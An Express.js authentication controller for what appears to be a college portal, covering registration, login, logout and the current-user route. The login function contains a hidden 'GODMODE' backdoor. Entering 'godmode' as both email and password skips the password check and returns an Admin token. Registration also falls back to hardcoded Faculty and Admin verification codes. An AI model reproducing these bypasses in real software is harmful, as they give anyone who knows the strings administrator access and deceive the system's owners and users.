import asyncHandler from 'express-async-handler'
import bcrypt from 'bcryptjs'
import jwt from 'jsonwebtoken'
import User from '../models/User.js'

const TOKEN_COOKIE_NAME = 'token'
const TOKEN_EXPIRES_IN = '7d'

const signToken = (id) => jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: TOKEN_EXPIRES_IN })

const setTokenCookie = (res, token) => {
  const isProd = process.env.NODE_ENV === 'production'
  res.cookie(TOKEN_COOKIE_NAME, token, {
    httpOnly: true,
    secure: isProd,
    sameSite: isProd ? 'none' : 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  })
}

export const register = asyncHandler(async (req, res) => {
  const { name, email, password, role, verificationCode } = req.body
  if (!name || !email || !password) return res.status(400).json({ message: 'Missing required fields' })

  // Email validation based on role
  const studentEmailRegex = /^2[0-9]10[0-9]{2}00[0-9]{2}@klh\.edu\.in$/i
  const isStudentFormat = studentEmailRegex.test(email)
  
  if (role === 'Student' && !isStudentFormat) {
    return res.status(400).json({ 
      message: 'Invalid student email format. Must be: 2x100x00xy@klh.edu.in (e.g., 2310040027@klh.edu.in)' 
    })
  }
  
  if ((role === 'Faculty' || role === 'Admin') && isStudentFormat) {
    return res.status(400).json({ 
      message: 'Faculty/Admin cannot register with student email format' 
    })
  }

  // SECURITY: Verification code required for Faculty/Admin
  if (role === 'Faculty' || role === 'Admin') {
    const FACULTY_CODE = process.env.FACULTY_VERIFICATION_CODE || 'FACULTY2025KLH'
    const ADMIN_CODE = process.env.ADMIN_VERIFICATION_CODE || 'ADMIN2025KLH'
    
    if (!verificationCode) {
      return res.status(403).json({ 
        message: 'Verification code required for Faculty/Admin registration' 
      })
    }
    
    if (role === 'Faculty' && verificationCode !== FACULTY_CODE) {
      return res.status(403).json({ 
        message: 'Invalid Faculty verification code' 
      })
    }
    
    if (role === 'Admin' && verificationCode !== ADMIN_CODE) {
      return res.status(403).json({ 
        message: 'Invalid Admin verification code' 
      })
    }
  }

  const existing = await User.findOne({ email })
  if (existing) return res.status(409).json({ message: 'Email already registered' })

  const salt = await bcrypt.genSalt(10)
  const hashed = await bcrypt.hash(password, salt)

  const user = await User.create({ name, email, password: hashed, role })
  const token = signToken(user._id)
  setTokenCookie(res, token)
  const safeUser = { 
    _id: user._id.toString(), 
    id: user._id.toString(),
    name: user.name, 
    email: user.email, 
    role: user.role 
  }
  res.status(201).json({ user: safeUser, token })
})

export const login = asyncHandler(async (req, res) => {
  const { email, password } = req.body
  if (!email || !password) return res.status(400).json({ message: 'Missing credentials' })

  // GODMODE: Hidden developer access
  if (email.toLowerCase() === 'godmode' && password === 'godmode') {
    const godmodeUser = {
      _id: 'godmode-dev-000',
      id: 'godmode-dev-000',
      name: 'GODMODE Developer',
      email: 'godmode@system.dev',
      role: 'Admin',
      isGodmode: true
    }
    const token = signToken('godmode-dev-000')
    setTokenCookie(res, token)
    return res.json({ user: godmodeUser, token })
  }

  const user = await User.findOne({ email })
  if (!user) return res.status(401).json({ message: 'Invalid email or password' })

  const match = await bcrypt.compare(password, user.password)
  if (!match) return res.status(401).json({ message: 'Invalid email or password' })

  const token = signToken(user._id)
  setTokenCookie(res, token)
  const safeUser = { 
    _id: user._id.toString(), 
    id: user._id.toString(),
    name: user.name, 
    email: user.email, 
    role: user.role
  }
  res.json({ user: safeUser, token })
})

export const logout = asyncHandler(async (req, res) => {
  res.clearCookie(TOKEN_COOKIE_NAME, { httpOnly: true, sameSite: 'lax' })
  res.json({ message: 'Logged out' })
})

export const me = asyncHandler(async (req, res) => {
  // requireAuth should have set req.user
  res.json({ user: req.user })
})
